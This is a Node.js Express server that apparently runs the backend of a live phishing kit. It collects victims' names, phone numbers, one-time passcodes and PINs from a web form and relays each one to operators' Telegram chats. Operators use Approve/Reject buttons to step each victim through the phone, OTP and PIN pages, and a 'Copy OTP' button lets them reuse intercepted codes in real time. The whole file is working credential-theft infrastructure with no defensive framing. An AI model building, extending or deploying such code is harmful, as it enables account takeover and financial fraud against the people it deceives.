require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const PORT = process.env.PORT || 10000;
const DOMAIN = (process.env.BACKEND_DOMAIN || '').replace(/\/+$/, '');
const REQUEST_TTL = parseInt(process.env.REQUEST_TTL || '3600', 10);

process.on('uncaughtException', (err) => {
  console.error('🔥 UNCAUGHT EXCEPTION:', err);
  process.exit(1);
});
process.on('unhandledRejection', (reason) => {
  console.error('🔥 UNHANDLED REJECTION:', reason);
  process.exit(1);
});

// ---------- STORAGE ----------
let redis = null;
const memStore = new Map();

(function initRedis() {
  const url = process.env.UPSTASH_REDIS_REST_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN;
  if (!url || !token) {
    console.log('⚠️ Redis not configured — using in-memory storage.');
    return;
  }
  try {
    const { Redis } = require('@upstash/redis');
    redis = new Redis({ url, token });
    console.log('✅ Redis storage enabled');
  } catch (e) {
    console.error('⚠️ Redis init failed:', e.message);
  }
})();

const store = {
  async save(kind, id, payload) {
    const key = `req:${kind}:${id}`;
    if (redis) {
      await redis.set(key, payload, { ex: REQUEST_TTL });
    } else {
      memStore.set(key, {
        data: payload,
        expiresAt: Date.now() + REQUEST_TTL * 1000
      });
    }
  },

  async get(kind, id) {
    const key = `req:${kind}:${id}`;
    let raw;

    if (redis) {
      raw = await redis.get(key);
    } else {
      const entry = memStore.get(key);
      if (!entry) return null;
      if (entry.expiresAt < Date.now()) {
        memStore.delete(key);
        return null;
      }
      raw = entry.data;
    }

    // Defensive: some Redis clients return a JSON string.
    if (typeof raw === 'string') {
      try { raw = JSON.parse(raw); } catch { return null; }
    }

    // Defensive: normalise the shape so callers always see
    // { meta, status } with status being null | true | false.
    if (!raw || typeof raw !== 'object') return null;

    return {
      meta: raw.meta || {},
      status: (raw.status === true || raw.status === false) ? raw.status : null
    };
  }
};

// ---------- EXPRESS ----------
const app = express();
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------- BOTS ----------
const bots = [];
Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;
  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];
  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

// ---------- FORMATTING ----------
function userHeader(name, phone) {
  return `👤 Name: ${name || '—'}\n📞 Phone: ${phone || '—'}`;
}

// ---------- TELEGRAM HELPERS ----------
async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    });
  } catch (e) {
    console.error('❌ Telegram sendMessage error:', e.response?.data || e.message);
  }
}

async function answerCallback(bot, id, extra = {}) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
      { callback_query_id: id, ...extra }
    );
  } catch (e) {
    console.error('❌ answerCallbackQuery error:', e.response?.data || e.message);
  }
}

// ---------- WEBHOOK MANAGEMENT ----------
async function setWebhook(bot) {
  if (!DOMAIN) {
    console.warn('⚠️ BACKEND_DOMAIN missing — webhook not set');
    return false;
  }

  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;

  try {
    const resp = await axios.get(
      `https://api.telegram.org/bot${bot.token}/setWebhook`,
      {
        params: {
          url,
          allowed_updates: ['message', 'callback_query'],
          drop_pending_updates: false
        }
      }
    );

    if (resp.data.ok) {
      console.log(`✅ Webhook set for ${bot.botId} -> ${url}`);
      return true;
    }
    console.error(`❌ Webhook failed for ${bot.botId}:`, resp.data.description);
    return false;
  } catch (e) {
    console.error('❌ Webhook error:', e.response?.data || e.message);
    return false;
  }
}

async function verifyAndRepairWebhook(bot) {
  try {
    const resp = await axios.get(`https://api.telegram.org/bot${bot.token}/getWebhookInfo`);
    const info = resp.data.result;
    const expected = `${DOMAIN}/telegram-webhook/${bot.botId}`;
    if (info.url !== expected || info.last_error_message || info.pending_update_count > 10) {
      console.log(`🔧 Repairing webhook for ${bot.botId} (error: ${info.last_error_message || 'none'})`);
      await setWebhook(bot);
    }
  } catch (e) {
    console.error('Webhook verify error:', e.message);
  }
}

async function setAllWebhooks() {
  for (const bot of bots) await setWebhook(bot);
}

function kindFromAction(action) {
  if (action.startsWith('phone_')) return 'phone';
  if (action.startsWith('otp_'))   return 'otp';
  if (action.startsWith('pin_'))   return 'pin';
  return null;
}

// ---------- PING ----------
app.get('/ping', (req, res) => res.status(200).send('pong'));

// ---------- PHONE ----------
app.post('/submit-phone', async (req, res) => {
  try {
    const { name, phone, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    await store.save('phone', requestId, {
      meta: { name, phone, botId },
      status: null
    });

    await sendTelegram(
      bot,
      `📱 PHONE VERIFICATION\n${userHeader(name, phone)}\n🆔 Ref: ${requestId}`,
      [[
        { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
        { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
      ]]
    );

    res.json({ requestId });
  } catch (err) {
    console.error('submit-phone error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-phone/:id', async (req, res) => {
  const entry = await store.get('phone', req.params.id);
  if (!entry) return res.json({ approved: null, expired: true });
  res.json({ approved: entry.status, expired: false });
});

// ---------- OTP ----------
app.post('/submit-otp', async (req, res) => {
  try {
    const { name, phone, otp, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    await store.save('otp', requestId, {
      meta: { name, phone, otp, botId },
      status: null
    });

    await sendTelegram(
      bot,
      `🔐 OTP VERIFICATION\n${userHeader(name, phone)}\n🔢 OTP: ${otp}\n🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
          { text: '❌ Wrong OTP',   callback_data: `otp_bad:${requestId}` }
        ],
        [
          { text: '📋 Copy OTP', callback_data: `copy_otp:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch (err) {
    console.error('submit-otp error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-otp/:id', async (req, res) => {
  const entry = await store.get('otp', req.params.id);
  if (!entry) return res.json({ approved: null, expired: true });
  res.json({ approved: entry.status, expired: false });
});

// ---------- PIN ----------
app.post('/submit-pin', async (req, res) => {
  try {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    await store.save('pin', requestId, {
      meta: { name, phone, botId },
      status: null
    });

    await sendTelegram(
      bot,
      `🔐 PIN VERIFICATION\n${userHeader(name, phone)}\n🔢 PIN: ${pin}\n🆔 Ref: ${requestId}`,
      [[
        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
        { text: '❌ Wrong PIN',   callback_data: `pin_bad:${requestId}` }
      ]]
    );

    res.json({ requestId });
  } catch (err) {
    console.error('submit-pin error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-pin/:id', async (req, res) => {
  const entry = await store.get('pin', req.params.id);
  if (!entry) return res.json({ approved: null, expired: true });
  res.json({ approved: entry.status, expired: false });
});

// ---------- TELEGRAM WEBHOOK ----------
app.post('/telegram-webhook/:botId', async (req, res) => {
  console.log('🔥 WEBHOOK HIT:', req.params.botId);

  // Always answer Telegram with 200 quickly. Handle errors below.
  try {
    const bot = getBot(req.params.botId);
    if (!bot) {
      console.warn(`⚠️ Unknown bot ID: ${req.params.botId}`);
      return res.sendStatus(200);
    }

    const cb = req.body && req.body.callback_query;
    if (!cb || !cb.data) {
      return res.sendStatus(200);
    }

    console.log(`📩 Received callback: ${cb.data} from ${cb.from && cb.from.id}`);

    const parts = cb.data.split(':');
    const action = parts[0];
    const requestId = parts[1];
    const kind = kindFromAction(action);

    if (!kind || !requestId) {
      await answerCallback(bot, cb.id, { text: 'Unknown action.', show_alert: true });
      return res.sendStatus(200);
    }

    const entry = await store.get(kind, requestId);
    console.log(`🔎 Store lookup ${kind}:${requestId} ->`, JSON.stringify(entry));

    if (!entry) {
      console.warn(`⏳ Request ${requestId} (${kind}) not found — expired or never existed`);
      await answerCallback(bot, cb.id, {
        text: '⏳ This request has expired. Please start a new application.',
        show_alert: true
      });
      return res.sendStatus(200);
    }

    // Correct check: only treat as processed if status is exactly true/false
    if (entry.status === true || entry.status === false) {
      const msg = entry.status ? '✅ already approved' : '❌ already rejected';
      await answerCallback(bot, cb.id, {
        text: `⏳ This request was ${msg}.`,
        show_alert: true
      });
      return res.sendStatus(200);
    }

    // Special action: copy OTP
    if (action === 'copy_otp') {
      if (entry.meta && entry.meta.otp) {
        await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          chat_id: cb.message.chat.id,
          text: `📋 Copy this OTP:\n<code>${entry.meta.otp}</code>`,
          parse_mode: 'HTML'
        });
        await answerCallback(bot, cb.id, { text: '✅ OTP sent above', show_alert: false });
      } else {
        await answerCallback(bot, cb.id, { text: '❌ OTP not found', show_alert: true });
      }
      return res.sendStatus(200);
    }

    let newStatus = null;
    let feedback = '';
    if (action === 'phone_ok')  { newStatus = true;  feedback = '✅ Phone approved – redirecting to OTP page'; }
    if (action === 'phone_bad') { newStatus = false; feedback = '❌ Phone rejected'; }
    if (action === 'otp_ok')    { newStatus = true;  feedback = '✅ OTP approved – redirecting to PIN page'; }
    if (action === 'otp_bad')   { newStatus = false; feedback = '❌ OTP rejected'; }
    if (action === 'pin_ok')    { newStatus = true;  feedback = '✅ PIN approved – redirecting to success page'; }
    if (action === 'pin_bad')   { newStatus = false; feedback = '❌ PIN rejected'; }

    if (newStatus === null) {
      await answerCallback(bot, cb.id, { text: 'Unknown action.', show_alert: true });
      return res.sendStatus(200);
    }

    entry.status = newStatus;
    await store.save(kind, requestId, entry);

    await sendTelegram(
      bot,
      `📝 ACTION TAKEN\n${userHeader(entry.meta.name, entry.meta.phone)}\n${feedback}`
    );

    await answerCallback(bot, cb.id);
    console.log(`✅ Processed callback for ${requestId} -> ${feedback}`);
    return res.sendStatus(200);

  } catch (err) {
    console.error('🔥 Webhook handler crashed:', err.message);

    try {
      const cb = req.body && req.body.callback_query;
      if (cb && cb.id) {
        const bot = getBot(req.params.botId);
        if (bot) {
          await answerCallback(bot, cb.id, {
            text: 'Server error. Please try again.',
            show_alert: true
          });
        }
      }
    } catch {}

    return res.sendStatus(200);
  }
});

// ---------- BOT ENTRY ----------
app.get('/bot/:botId', (req, res) => {
  const bot = bots.find(b => b.botId === req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');
  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ---------- HEALTH ----------
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    pid: process.pid,
    bots: bots.length,
    webhookDomain: DOMAIN || 'not set',
    uptime: process.uptime(),
    memory: process.memoryUsage().rss,
    storage: redis ? 'redis' : 'memory'
  });
});

app.get('/debug/bot', (req, res) => {
  res.json({
    count: bots.length,
    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId })),
    storage: redis ? 'redis' : 'memory'
  });
});

// ---------- MANUAL RESTART ----------
app.get('/restart', (req, res) => {
  const key = process.env.RESTART_KEY;
  if (!key) return res.status(403).send('Restart disabled');
  if (req.query.key !== key) return res.status(403).send('Forbidden');

  res.send('Restarting...');
  setTimeout(() => process.exit(1), 500);
});

// ---------- WEBHOOK REPAIR LOOP ----------
setInterval(async () => {
  for (const bot of bots) {
    await verifyAndRepairWebhook(bot);
  }
}, 5 * 60 * 1000);

// ---------- BOOTSTRAP ----------
(async function bootstrap() {
  if (!DOMAIN) {
    console.error('❌ BACKEND_DOMAIN not set — webhooks will fail!');
  } else if (!DOMAIN.startsWith('https://')) {
    console.warn('⚠️ Domain is not HTTPS — Telegram may reject webhooks!');
  }

  if (!redis) {
    console.warn('⚠️ Persistent storage is OFF — pending requests will be lost on restart.');
  }

  app.listen(PORT, async () => {
    console.log(`🚀 Server listening on port ${PORT}`);
    await setAllWebhooks();

    setTimeout(async () => {
      for (const bot of bots) {
        try {
          const resp = await axios.get(`https://api.telegram.org/bot${bot.token}/getWebhookInfo`);
          console.log(`🔍 ${bot.botId} webhook:`, resp.data.result);
        } catch {}
      }
    }, 2000);
  });
})();